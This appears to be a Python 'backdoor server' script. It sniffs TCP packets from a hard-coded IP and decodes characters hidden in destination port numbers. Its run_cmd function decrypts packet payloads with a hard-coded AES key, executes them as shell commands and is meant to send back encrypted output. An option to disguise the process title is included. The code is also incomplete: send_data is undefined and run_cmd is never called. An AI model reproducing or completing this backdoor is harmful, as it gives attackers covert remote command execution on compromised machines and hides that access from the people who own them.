import time
import base64
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from subprocess import *
from Crypto.Cipher import AES
CONN_IPS = {}
MASTER_KEY = "CorrectHorseBatteryStapleGunHead"


def encrypt_val(text):
	secret = AES.new(MASTER_KEY)
	tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
	cipher_text = base64.b64encode(secret.encrypt(tag_string))
	return cipher_text


def decrypt_val(cipher):
	secret = AES.new(MASTER_KEY)
	decrypted = secret.decrypt(base64.b64decode(cipher))
	result = decrypted.rstrip("\0")
	return result


def verify_root():
	if(os.getuid() != 0):
		exit("This program must be run with root/sudo")


def run_cmd(packet):
	data = packet['Raw'].load
	data = decrypt_val(data)
	output = []
	try:
		command, arguments = data.split(' ', 1)
	except ValueError:
		arguments = None
	try:
		if(arguments is not None):
			out, err = Popen([command, arguments], stdout=PIPE, stderr=PIPE).communicate()
		else:
			out, err = Popen(data, stdout=PIPE, stderr=PIPE).communicate()
	except OSError:
		output = "Invalid Command / Command not found"
	if(out):
		output.append(out)
	if(err):
		output.append(err)
	output = encrypt_val("".join(output))
	time.sleep(0.1)
	send_data(packet[1].src, packet[2].sport, output)


def decode(packet):
	if(packet[1].id == 42424):
		sys.stdout.write('\n')
		return
	dport = packet[2].dport
	char1 = chr((dport >> 8) & 0xff)
	char2 = chr(dport & 0xff)
	if(char2 is not None):
		sys.stdout.write("{}{}".format(char1, char2))
	else:
		sys.stdout.write("{}".format(char1))
	sys.stdout.flush()


def parse(packet):
	if(packet[1].src == "192.168.0.18"):
		decode(packet)


def main():
	print("Sniffing for traffic...")
	sniff(filter="tcp", iface=args.iface, prn=parse)


if __name__ == '__main__':
	connecting_ips = {}
	verify_root()
	parser = argparse.ArgumentParser("Python backdoor server")
	parser.add_argument("-p", "--pname", help="Disguise process title")
	parser.add_argument("-i", "--iface", help="Interface to sniff packets on")
	args = parser.parse_args()
	try:
		main()
	except KeyboardInterrupt:
		exit("Ctrl+C received. Exiting...")
